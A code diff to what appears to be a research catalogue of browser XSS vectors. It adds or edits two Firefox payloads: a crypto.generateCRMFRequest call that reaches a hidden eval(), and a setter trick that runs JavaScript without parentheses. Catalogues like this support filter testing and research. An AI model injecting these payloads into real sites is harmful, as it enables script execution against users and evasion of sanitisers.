@@ -58,7 +58,7 @@
             'id'         : 5, 
             'category'   : 'dom', 
             'name'       : 'Firefox crypto object - hidden eval()',
-            'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'alert(1)\',384,null,\'rsa-dual-use\')',
+            'data'       : 'crypto.generateCRMFRequest(\'CN=0\',0,0,null,\'%js_alert%\',384,null,\'rsa-dual-use\')',
             'description': 'This vector uncovers a hidden eval() inside the Firefox crypto object',
             'browsers'   : {
                 'firefox': [
@@ -66,6 +66,20 @@
                 ]
             },
             'tags'       : ['xss', 'dom', 'ff', 'crypto', 'eval', 'csp'],
+            'reporter'   : '.mario'
+        },
+        { /* ID 6 - Firefox setter based JavaScript execution */
+            'id'         : 6, 
+            'category'   : 'javascript', 
+            'name'       : 'Firefox setter based JavaScript execution',
+            'data'       : '({set/**/$($){_/**/setter=$,_=1}}).$=%js_alert_only%',
+            'description': 'Using setters on Gecko/Firefox to execute JavaScript without parenthesis',
+            'browsers'   : {
+                'firefox': [
+                    '1.x', '2.x', '3.x', '3.5', '3.6', '3.7'
+                ]
+            },
+            'tags'       : ['xss', 'dom', 'ff', 'setter'],
             'reporter'   : '.mario'
         }
     ]        
